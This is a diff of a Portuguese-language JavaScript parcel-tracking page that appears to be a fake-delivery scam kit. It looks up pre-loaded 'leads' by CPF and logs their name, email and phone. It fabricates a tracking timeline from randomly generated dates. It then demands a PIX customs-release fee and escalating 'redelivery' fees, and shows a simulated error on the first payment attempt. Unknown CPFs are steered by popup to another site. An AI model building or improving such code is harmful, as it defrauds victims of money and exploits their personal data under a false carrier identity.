@@ -1,5 +1,6 @@
 /**
- * Sistema de rastreamento principal
+ * Sistema de rastreamento - VERSÃO 16.9: DADOS EXCLUSIVOS DO SUPABASE
+ * Transportadora como visualizador dos dados controlados pelo painel
  */
 import { CPFValidator } from '../utils/cpf-validator.js';
 import { DataService } from '../utils/data-service.js';
@@ -22,7 +23,8 @@ export class TrackingSystem {
         this.currentStage = 1;
         this.isLiberationPaid = false;
         
-        console.log('🚀 TrackingSystem inicializado');
+        console.log('🚀 TrackingSystem inicializado - Modo Transportadora');
+        console.log('🎯 Fonte de dados: EXCLUSIVAMENTE Supabase via Painel');
         this.init();
     }
 
@@ -49,13 +51,11 @@ export class TrackingSystem {
             form.addEventListener('submit', (e) => this.handleFormSubmit(e));
         }
 
-        // Configurar accordion dos detalhes
         const detailsHeader = document.getElementById('detailsHeader');
         if (detailsHeader) {
             detailsHeader.addEventListener('click', () => this.toggleOrderDetails());
         }
 
-        // Configurar modal de liberação
         this.setupLiberationModal();
     }
 
@@ -99,17 +99,17 @@ export class TrackingSystem {
 
     async handleTrackingSubmit() {
         console.log('🔍 Iniciando rastreamento para CPF:', this.currentCPF);
+        console.log('🎯 Buscando dados EXCLUSIVAMENTE no Supabase...');
         
         this.showLoadingNotification();
         
         try {
-            // 🎯 PAINEL CENTRALIZADO: Dados distribuídos pelo painel
-            console.log('🎯 Consultando dados via painel centralizado...');
-            const leadResult = await this.dbService.getLeadFromLocalStorage(this.currentCPF);
+            // 🎯 BUSCAR EXCLUSIVAMENTE NO SUPABASE (dados do painel)
+            const leadResult = await this.dbService.getLeadByCPF(this.currentCPF);
             
             if (leadResult.success && leadResult.data) {
-                // ✅ Lead encontrado via painel - dados centralizados
-                console.log('✅ Lead encontrado via painel centralizado:', leadResult.data);
+                // ✅ Lead encontrado no Supabase (controlado pelo painel)
+                console.log('✅ Lead encontrado no Supabase (dados do painel):', leadResult.data);
                 
                 this.userData = {
                     nome: leadResult.data.nome_completo,
@@ -123,46 +123,176 @@ export class TrackingSystem {
                 
                 this.leadData = leadResult.data;
                 
-                console.log('📦 Dados distribuídos pelo painel:', {
+                console.log('📦 Dados controlados pelo painel:', {
                     nome: this.userData.nome,
                     cpf: this.userData.cpf,
                     email: this.userData.email,
                     telefone: this.userData.telefone,
                     etapa_atual: this.leadData.etapa_atual
                 });
-                console.log('📦 Etapa atual do lead:', this.leadData.etapa_atual);
                 
                 this.closeLoadingNotification();
                 this.displayResults();
-            } else {
-                // ⚠️ Lead não cadastrado no painel - usar API externa como fallback
-                console.log('🌐 Lead não encontrado no painel, usando API externa...');
-                const result = await this.dataService.fetchCPFData(this.currentCPF);
                 
-                if (result && result.DADOS) {
-                    this.userData = {
-                        nome: result.DADOS.nome,
-                        cpf: this.currentCPF,
-                        email: null, // Não disponível via API externa
-                        telefone: null, // Não disponível via API externa
-                        nascimento: result.DADOS.nascimento,
-                        situacao: result.DADOS.situacao || 'REGULAR'
-                    };
-                    
-                    console.log('✅ Dados básicos via API (lead não no painel):', this.userData);
-                    console.log('⚠️ Para pagamentos, será necessário gerar email/telefone');
-                    
-                    this.closeLoadingNotification();
-                    this.displayResults();
-                } else {
-                    throw new Error('Dados não encontrados');
-                }
+            } else {
+                // ❌ CPF não encontrado no Supabase (não cadastrado pelo painel)
+                console.log('❌ CPF não encontrado no Supabase (não cadastrado pelo painel)');
+                this.closeLoadingNotification();
+                this.showCPFNotFoundError();
             }
+            
         } catch (error) {
             console.error('❌ Erro no rastreamento:', error);
             this.closeLoadingNotification();
-            this.showError('Erro ao buscar dados. Tente novamente.');
+            this.showCPFNotFoundError();
         }
+    }
+
+    showCPFNotFoundError() {
+        console.log('🚫 Exibindo erro de CPF não identificado');
+        
+        // Limpar resultados anteriores
+        this.hideResults();
+        
+        // Mostrar mensagem de erro
+        this.showError('CPF não identificado ou CPF inválido');
+        
+        // Mostrar pop-up após 2 segundos
+        setTimeout(() => {
+            this.showNotFoundPopup();
+        }, 2000);
+    }
+
+    showNotFoundPopup() {
+        console.log('💬 Exibindo pop-up de não encontrado');
+        
+        const popup = document.createElement('div');
+        popup.id = 'notFoundPopup';
+        popup.style.cssText = `
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #fff;
+            border: 2px solid #1e4a6b;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            z-index: 2000;
+            max-width: 300px;
+            cursor: pointer;
+            animation: slideInRight 0.4s ease;
+            transition: all 0.3s ease;
+        `;
+        
+        popup.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 10px;">
+                <i class="fas fa-search" style="color: #1e4a6b; font-size: 1.2rem;"></i>
+                <h4 style="margin: 0; color: #2c3e50; font-size: 1rem; font-weight: 600;">
+                    Não encontrou sua encomenda?
+                </h4>
+            </div>
+            <p style="margin: 0; color: #666; font-size: 0.9rem; line-height: 1.4;">
+                Clique aqui para verificar
+            </p>
+            <div style="position: absolute; top: 8px; right: 8px;">
+                <button id="closeNotFoundPopup" style="
+                    background: none; 
+                    border: none; 
+                    color: #999; 
+                    font-size: 1rem; 
+                    cursor: pointer;
+                    width: 20px;
+                    height: 20px;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                ">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+        `;
+        
+        // Adicionar animação CSS
+        if (!document.getElementById('popupAnimations')) {
+            const style = document.createElement('style');
+            style.id = 'popupAnimations';
+            style.textContent = `
+                @keyframes slideInRight {
+                    from { 
+                        opacity: 0; 
+                        transform: translateX(100%); 
+                    }
+                    to { 
+                        opacity: 1; 
+                        transform: translateX(0); 
+                    }
+                }
+                @keyframes slideOutRight {
+                    from { 
+                        opacity: 1; 
+                        transform: translateX(0); 
+                    }
+                    to { 
+                        opacity: 0; 
+                        transform: translateX(100%); 
+                    }
+                }
+            `;
+            document.head.appendChild(style);
+        }
+        
+        // Eventos
+        popup.addEventListener('click', (e) => {
+            if (e.target.id !== 'closeNotFoundPopup') {
+                window.open('https://logixexpresscom.netlify.app/', '_self');
+            }
+        });
+        
+        popup.addEventListener('mouseenter', () => {
+            popup.style.transform = 'scale(1.02)';
+            popup.style.boxShadow = '0 12px 35px rgba(0, 0, 0, 0.3)';
+        });
+        
+        popup.addEventListener('mouseleave', () => {
+            popup.style.transform = 'scale(1)';
+            popup.style.boxShadow = '0 8px 25px rgba(0, 0, 0, 0.2)';
+        });
+        
+        // Botão fechar
+        const closeButton = popup.querySelector('#closeNotFoundPopup');
+        if (closeButton) {
+            closeButton.addEventListener('click', (e) => {
+                e.stopPropagation();
+                this.closeNotFoundPopup();
+            });
+        }
+        
+        document.body.appendChild(popup);
+        
+        // Auto-fechar após 10 segundos
+        setTimeout(() => {
+            this.closeNotFoundPopup();
+        }, 10000);
+    }
+
+    closeNotFoundPopup() {
+        const popup = document.getElementById('notFoundPopup');
+        if (popup) {
+            popup.style.animation = 'slideOutRight 0.4s ease';
+            setTimeout(() => {
+                if (popup.parentNode) {
+                    popup.remove();
+                }
+            }, 400);
+        }
+    }
+
+    hideResults() {
+        const orderDetails = document.getElementById('orderDetails');
+        const trackingResults = document.getElementById('trackingResults');
+        
+        if (orderDetails) orderDetails.style.display = 'none';
+        if (trackingResults) trackingResults.style.display = 'none';
     }
 
     generateBirthDate(cpf) {
@@ -178,16 +308,16 @@ export class TrackingSystem {
         const today = new Date();
         const dates = this.generateRealisticDates(today, 11);
         
-        // Determinar etapa atual baseada nos dados do lead (se disponível)
+        // Determinar etapa atual baseada nos dados do Supabase (painel)
         let currentStep = 11; // Padrão
         if (this.leadData && this.leadData.etapa_atual) {
             currentStep = Math.min(this.leadData.etapa_atual, 11);
         }
         
-        // Verificar se liberação já foi paga
+        // Verificar se liberação já foi paga (dados do painel)
         if (this.leadData && this.leadData.status_pagamento === 'pago') {
             this.isLiberationPaid = true;
-            currentStep = Math.max(currentStep, 12); // Garantir que está pelo menos na etapa 12
+            currentStep = Math.max(currentStep, 12);
         }
         
         this.trackingData = {
@@ -207,7 +337,7 @@ export class TrackingSystem {
             ]
         };
         
-        // Adicionar etapa 12 se liberação foi paga
+        // Adicionar etapa 12 se liberação foi paga (dados do painel)
         if (this.isLiberationPaid && currentStep >= 12) {
             this.trackingData.steps.push({
                 id: 12,
@@ -218,7 +348,7 @@ export class TrackingSystem {
             });
         }
         
-        console.log('📊 Dados de rastreamento gerados:', {
+        console.log('📊 Dados de rastreamento baseados no painel:', {
             currentStep: currentStep,
             totalSteps: this.trackingData.steps.length,
             liberationPaid: this.isLiberationPaid
@@ -230,7 +360,6 @@ export class TrackingSystem {
         this.generateTrackingData();
         this.displayTrackingResults();
         
-        // Scroll para resultados
         const orderDetails = document.getElementById('orderDetails');
         if (orderDetails) {
             setTimeout(() => {
@@ -287,20 +416,17 @@ export class TrackingSystem {
         const now = new Date();
         const today = new Date(endDate);
         
-        // Dia -2
         const day1 = new Date(today);
         day1.setDate(day1.getDate() - 2);
         dates.push(this.getRandomTimeOnDate(day1));
         dates.push(this.getRandomTimeOnDate(day1));
         
-        // Dia -1
         const day2 = new Date(today);
         day2.setDate(day2.getDate() - 1);
         for (let i = 2; i < 9; i++) {
             dates.push(this.getRandomTimeOnDate(day2));
         }
         
-        // Hoje - horários anteriores ao atual
         dates.push(this.getTimeBeforeNow(today, now, 1));
         dates.push(this.getTimeBeforeNow(today, now, 2));
         
@@ -367,7 +493,6 @@ export class TrackingSystem {
         
         let buttonHtml = '';
         
-        // 🔓 Botão "Liberar Pacote" APENAS na etapa 11 e se não foi pago
         if (step.id === 11 && step.needsLiberation && !this.isLiberationPaid) {
             buttonHtml = `
                 <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showLiberationModal()">
@@ -376,7 +501,6 @@ export class TrackingSystem {
             `;
         }
         
-        // 🚚 Botões "Reenviar Pacote" nas etapas específicas (16, 20, 24)
         if (this.needsDeliveryPayment(step.id)) {
             const deliveryValue = this.getDeliveryValue(step.id);
             buttonHtml = `
@@ -406,21 +530,19 @@ export class TrackingSystem {
     }
 
     needsDeliveryPayment(stepId) {
-        // Botões "Reenviar Pacote" nas etapas específicas
         return [16, 20, 24].includes(stepId);
     }
 
     getDeliveryValue(stepId) {
         const values = {
-            16: 9.74,  // 1ª tentativa
-            20: 14.98, // 2ª tentativa
-            24: 18.96  // 3ª tentativa
+            16: 9.74,
+            20: 14.98,
+            24: 18.96
         };
         return values[stepId] || 9.74;
     }
 
     setupLiberationModal() {
-        // Configurar eventos do modal de liberação
         const closeButton = document.getElementById('closeModal');
         const modal = document.getElementById('liberationModal');
         const copyButton = document.getElementById('copyPixButtonModal');
@@ -456,7 +578,6 @@ export class TrackingSystem {
     showLiberationModal() {
         console.log('🔓 Abrindo modal de liberação aduaneira');
         
-        // 🚀 Gerar PIX automaticamente ao abrir modal
         this.generateLiberationPix();
         
         const modal = document.getElementById('liberationModal');
@@ -464,7 +585,6 @@ export class TrackingSystem {
             modal.style.display = 'flex';
             document.body.style.overflow = 'hidden';
             
-            // Resetar botão para primeira tentativa
             const simulateButton = document.getElementById('simulatePaymentButton');
             if (simulateButton) {
                 simulateButton.innerHTML = '<i class="fas fa-credit-card"></i> Simular Pagamento';
@@ -474,37 +594,32 @@ export class TrackingSystem {
     }
 
     async generateLiberationPix() {
-        console.log('🔄 Gerando PIX automático via Zentra Pay Brasil...');
+        console.log('🔄 Gerando PIX automático para Taxa Alfandegária...');
         
         if (!this.userData) {
-            console.error('❌ Dados do lead não disponíveis (não distribuídos pelo painel)');
+            console.error('❌ Dados do usuário não disponíveis para gerar PIX');
             return;
         }
-        
+
         try {
-            // Mostrar indicador enquanto gera PIX real
             this.showPixGenerationIndicator();
             
-            // 🚀 Gerar PIX automático via Zentra Pay Brasil
             const pixResult = await this.zentraPayService.generatePixForStage(
                 this.userData, 
                 'taxa_alfandegaria'
             );
             
             if (pixResult.success) {
-                console.log('✅ PIX automático gerado via Zentra Pay Brasil!');
-                
-                // Atualizar modal com PIX real
+                console.log('✅ PIX da Taxa Alfandegária gerado automaticamente!');
                 this.updateModalWithRealPix(pixResult);
-                
                 this.hidePixGenerationIndicator();
             } else {
-                console.warn('⚠️ Falha na API Zentra Pay, usando PIX estático');
+                console.warn('⚠️ Falha ao gerar PIX, usando dados estáticos');
                 this.hidePixGenerationIndicator();
             }
             
         } catch (error) {
-            console.error('❌ Erro na integração Zentra Pay:', error);
+            console.error('❌ Erro ao gerar PIX automático:', error);
             this.hidePixGenerationIndicator();
         }
     }
@@ -523,7 +638,6 @@ export class TrackingSystem {
             pixCodeTextarea.style.opacity = '0.7';
         }
         
-        // Adicionar indicador de carregamento
         const modal = document.getElementById('liberationModal');
         if (modal && !document.getElementById('pixLoadingIndicator')) {
             const indicator = document.createElement('div');
@@ -572,26 +686,22 @@ export class TrackingSystem {
     updateModalWithRealPix(pixResult) {
         console.log('🔄 Atualizando modal com PIX real da Zentra Pay...');
         
-        // Atualizar QR Code
         const qrCodeImg = document.getElementById('realPixQrCode');
         if (qrCodeImg && pixResult.qrCode) {
             qrCodeImg.src = pixResult.qrCode;
             console.log('✅ QR Code atualizado com URL real');
         } else if (qrCodeImg && pixResult.pixPayload) {
-            // Gerar QR Code a partir do payload
             const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult.pixPayload)}`;
             qrCodeImg.src = qrUrl;
             console.log('✅ QR Code gerado a partir do payload');
         }
         
-        // Atualizar código PIX
         const pixCodeTextarea = document.getElementById('pixCodeModal');
         if (pixCodeTextarea && pixResult.pixPayload) {
             pixCodeTextarea.value = pixResult.pixPayload;
             console.log('✅ Código PIX atualizado');
         }
         
-        // Salvar dados do PIX para referência
         this.currentPixData = pixResult;
     }
 
@@ -611,13 +721,11 @@ export class TrackingSystem {
         console.log(`💳 Tentativa de pagamento ${this.liberationAttempts}/${this.maxLiberationAttempts}`);
         
         if (this.liberationAttempts === 1) {
-            // Primeira tentativa - erro
             console.log('❌ Primeira tentativa - simulando erro');
             alert('Erro ao processar pagamento');
             simulateButton.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
             simulateButton.setAttribute('data-retry', 'true');
         } else {
-            // Segunda tentativa - sucesso
             console.log('✅ Segunda tentativa - sucesso');
             this.processSuccessfulPayment();
         }
@@ -626,28 +734,15 @@ export class TrackingSystem {
     async processSuccessfulPayment() {
         console.log('🎉 Pagamento processado com sucesso!');
         
-        // Marcar como pago
         this.isLiberationPaid = true;
-        
-        // Fechar modal
         this.closeLiberationModal();
-        
-        // Avançar para etapa 12
         this.addStage12();
         
-        // 💾 Atualizar no Supabase
+        // 🎯 ATUALIZAR NO SUPABASE (dados controlados pelo painel)
         if (this.currentCPF) {
-            // 🎯 PAINEL CENTRALIZADO: Atualizar no painel (localStorage)
-            this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
-            this.dbService.updateLeadStage(this.currentCPF, 12);
-            console.log('💾 Status atualizado no painel: pago, etapa 12');
-            
-            // 🔄 Sincronizar com Supabase após atualização
-            const leadData = await this.dbService.getLeadFromLocalStorage(this.currentCPF);
-            if (leadData.success && leadData.data) {
-                await this.dbService.syncLeadToSupabase(leadData.data);
-                console.log('🔄 Lead sincronizado com Supabase após pagamento');
-            }
+            await this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
+            await this.dbService.updateLeadStage(this.currentCPF, 12);
+            console.log('💾 Status atualizado no Supabase via painel: pago, etapa 12');
         }
     }
 
@@ -657,22 +752,17 @@ export class TrackingSystem {
         const timeline = document.getElementById('trackingTimeline');
         if (!timeline) return;
         
-        // Criar nova etapa 12
         const stage12Date = new Date();
         const stage12Item = this.createStage12Item(stage12Date);
         
         timeline.appendChild(stage12Item);
         
-        // Animar entrada
         setTimeout(() => {
             stage12Item.style.opacity = '1';
             stage12Item.style.transform = 'translateY(0)';
-            
-            // Scroll para nova etapa
             stage12Item.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }, 100);
         
-        // Atualizar status atual
         const currentStatus = document.getElementById('currentStatus');
         if (currentStatus) {
             currentStatus.textContent = 'Pedido liberado na alfândega';
@@ -712,7 +802,6 @@ export class TrackingSystem {
         
         console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - R$ ${value.toFixed(2)}`);
         
-        // 🚀 Gerar PIX automático para tentativa de entrega
         if (this.userData) {
             try {
                 console.log('🔄 Gerando PIX automático para tentativa de entrega...');
@@ -750,7 +839,6 @@ export class TrackingSystem {
     }
 
     showDeliveryPixModal(stepId, value, attemptNumber, pixResult) {
-        // Implementar modal de PIX para tentativa de entrega
         console.log(`💳 Exibindo modal de PIX - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
         
         if (pixResult && pixResult.success) {
@@ -759,7 +847,6 @@ export class TrackingSystem {
             console.log('⚠️ Modal com PIX estático (fallback)');
         }
         
-        // TODO: Implementar modal completo de tentativa de entrega
         alert(`PIX gerado para Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}\n\n${pixResult ? 'PIX Real Gerado!' : 'Usando PIX Estático'}`);
     }
 
@@ -870,7 +957,7 @@ export class TrackingSystem {
                 Identificando Pedido...
             </h3>
             <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
-                Aguarde enquanto rastreamos seu pacote
+                Aguarde enquanto consultamos o Supabase
             </p>
         `;
 
